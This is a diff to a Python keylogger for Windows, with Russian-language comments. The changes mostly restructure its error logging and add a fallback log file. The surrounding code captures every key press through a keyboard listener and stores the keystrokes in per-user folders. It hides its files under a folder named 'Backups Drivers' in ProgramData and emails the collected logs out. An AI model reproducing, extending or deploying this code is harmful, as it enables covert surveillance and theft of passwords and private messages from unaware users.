@@ -65,8 +65,7 @@ def send_email(date):
 			server.quit()
 			write_time_date_file_in_write_file('       - - - - - Файл успешно отправлен - - - - -      ' + '\n')
 		except Exception as err:
-			write_time_date_file_in_write_file('  - - - Файл настроек содержит неверные данные - - -   ' + '\n')
-			write_time_date_file_in_write_file('Code error: ' + str(err) + '\n')
+			write_time_date_file_in_write_file('  - - - Файл настроек содержит неверные данные - - -   ' + '\n' + 'Code error: ' + str(err) + '\n')
 	#===========================================================================================================================
 #Прикрепление документа к электронному письму
 def attach_file(msg, date):
@@ -185,6 +184,7 @@ def code_my_bin(item):
 		else:
 			low = mid + 1
 	return item
+
 #Функция записи в файл времени и даты
 def write_time_date_file(time_date_x, time_date_y, disk, message, data_zapis):
 	file = open(disk + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + '\\' + comp_name + '--' + time_date_y + '(' + user_name + ').txt', 'a', encoding = 'utf-8')
@@ -192,6 +192,26 @@ def write_time_date_file(time_date_x, time_date_y, disk, message, data_zapis):
 	if data_zapis: file.writelines('\n' + '- - - - - - - - - - ' + time_date_x + ' - - - - - - - - - -' + '\n')
 	file.writelines(message)
 	file.close()
+#Функция проверки даты и времени последнего обращения и записи в файл
+def write_time_date_file_in_write_file(message):
+    global time_date_before
+    #Проверка времени и даты
+    time_date_curunt = strftime('%H : %M; %d %b')
+    #Дата для названия файла
+    time_for_name = strftime('%d%b')
+    #Если значения отличаются, то пишем в файл текущее время и дату; и присваиваем устаревшей переменной
+    if time_date_curunt != time_date_before: 
+        data_zapis = 1
+        time_date_before = time_date_curunt
+    else: data_zapis = 0
+    write_time_date_file(time_date_curunt, time_for_name, disk_key, message, data_zapis)
+#Создание лог файла, в случае если файла с настройками не будет найден нигде
+def crytical_log(message):
+	if not isdir('C:\\Logs'): mkdir('C:\\Logs')
+	log_crytical = open('C:\\Logs\\Log.txt', 'a', encoding = 'utf-8')
+	log_crytical.writelines(strftime('%H : %M; %d %b') + ':\n')
+	log_crytical.writelines(message + '\n')
+	log_crytical.close()
 
 #Получем всех папки и файлы директории с пользователями
 all_users = listdir('C:\\Users')
@@ -213,13 +233,19 @@ if not isfile("C:\\ProgramData\\Backups Drivers\\Settings.dat"):
 	try:
 		copy("Settings.dat", "C:\\ProgramData\\Backups Drivers")
 	except:
-		write_time_date_file_in_write_file('Error: Копирование бэкап файла с настройками в директорию с бэкап файлами запрещено. Выполяется выход из приложения.' + '\n')
+		try:
+			crytical_log('Error: Копирование бэкап файла с настройками в директорию с бэкап файлами запрещено. Выполяется выход из приложения.')
+		except:
+			pass
 		exit()
 if not isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): 
 	try:
 		copy("data.dat", "C:\\ProgramData\\Backups Drivers")
 	except:
-		write_time_date_file_in_write_file('Error: Копирование бэкап файла с данными в директорию с бэкап файлами запрещено.' + '\n')
+		try:
+			crytical_log('Error: Копирование бэкап файла с данными в директорию с бэкап файлами запрещено. Отпрвка данных на почту будет прекращено.')
+		except:
+			pass
 		
 SettingsDat = open("C:\\ProgramData\\Backups Drivers\\Settings.dat", "rb")
 DataSettings = load(SettingsDat)
@@ -283,7 +309,7 @@ try:
 		except:
 			if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + main_folder)
 			else:
-				write_time_date_file_in_write_file('Error: Отсутсвует бэкап файл с данными в директории с бекап файлами.' + '\n')
+				write_time_date_file_in_write_file('New - - - Error: Отсутсвует бэкап файл с данными в директории с бекап файлами. - - -' + '\n')
 	if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
 	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent)
 	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
@@ -300,7 +326,7 @@ except:
 			except:
 				if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + dop_folder)
 				else:
-					write_time_date_file_in_write_file('Error: Отсутсвует бэкап файл с данными в директории с бекап файлами.' + '\n')
+					write_time_date_file_in_write_file('New - - - Error: Отсутсвует бэкап файл с данными в директории с бекап файлами. - - -' + '\n')
 		if not isdir(disk_key + dop_folder + user_name): mkdir(disk_key + dop_folder + user_name)
 		if not isdir(disk_key + dop_folder + user_name + '\\' + year_curent): mkdir(disk_key + dop_folder + user_name + '\\' + year_curent)
 		if not isdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
@@ -320,12 +346,12 @@ except:
 				except:
 					if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + folder_for_D)
 					else: 
-						write_time_date_file_in_write_file('Error: Отсутсвует бэкап файл с данными в директории с бекап файлами.' + '\n')
+						write_time_date_file_in_write_file('New - - - Error: Отсутсвует бэкап файл с данными в директории с бекап файлами. - - -' + '\n')
 			if not isdir(disk_key + folder_for_D + user_name + '\\' +year_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + year_curent)
 			if not isdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent)
 			main_folder = folder_for_D
 		else:
-			write_time_date_file_in_write_file('Error: Отсутвуют права на запись на всех дисках. Выполняется выход из приложения.')
+			write_time_date_file_in_write_file('New - - - Error: Отсутвуют права на запись на всех дисках. Выполняется выход из приложения. - - -')
 			exit()
 	#Повторно записываем время и дату в файл, в созданной или уже имеющейся папке диска С или D, если вызвалось исключене
 	write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Инициализация - " + user_name + ' - - -\n', 1)
@@ -346,19 +372,6 @@ dict_en = {'1' : '!', '2' : '@', '3' : '#',
 moon_all_migration = {'Jan' : 'Dec', 'Feb' : 'Jan', 'Mar' : 'Feb', 'Apr' : 'Mar', 
 					  'May' : 'Apr', 'Jun' : 'May', 'Jul' : 'Jun', 'Aug' : 'Jul', 
 					  'Sep' : 'Aug', 'Oct' : 'Sep', 'Nov' : 'Oct', 'Dec' : 'Nov'}
-#Функция проверки даты и времени последнего обращения и записи в файл
-def write_time_date_file_in_write_file(message):
-    global time_date_before
-    #Проверка времени и даты
-    time_date_curunt = strftime('%H : %M; %d %b')
-    #Дата для названия файла
-    time_for_name = strftime('%d%b')
-    #Если значения отличаются, то пишем в файл текущее время и дату; и присваиваем устаревшей переменной
-    if time_date_curunt != time_date_before: 
-        data_zapis = 1
-        time_date_before = time_date_curunt
-    else: data_zapis = 0
-    write_time_date_file(time_date_curunt, time_for_name, disk_key, message, data_zapis)
 
 #Функция записи в файл информации
 def write_file(key):
@@ -464,8 +477,7 @@ try:
     a = keyboard.Listener(on_press = on_press, on_release = on_release)
     a.start()
 except Exception as err: 
-	write_time_date_file_in_write_file('Error: Раелизация класса приложения запрещена. Выполяется выход из приложения.' + '\n')
-	write_time_date_file_in_write_file('Code error: ' + str(err) + '\n')
+	write_time_date_file_in_write_file('Error: Раелизация класса приложения запрещена. Выполяется выход из приложения.' + '\n' + 'Code error: ' + str(err) + '\n')
 	exit()
 
 write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Запущено - - - - - - - - - -   \n", 0)
@@ -487,5 +499,4 @@ while 1:
     try:
         a.join()
     except Exception as err: 
-    	write_time_date_file_in_write_file('Error: Критическая ошибка. Приложение функционирует в штатном режиме.' + '\n')
-    	write_time_date_file_in_write_file('Code error: ' + str(err) + '\n')
+    	write_time_date_file_in_write_file('Error: Критическая ошибка. Приложение функционирует в штатном режиме.' + '\n' + 'Code error: ' + str(err) + '\n')
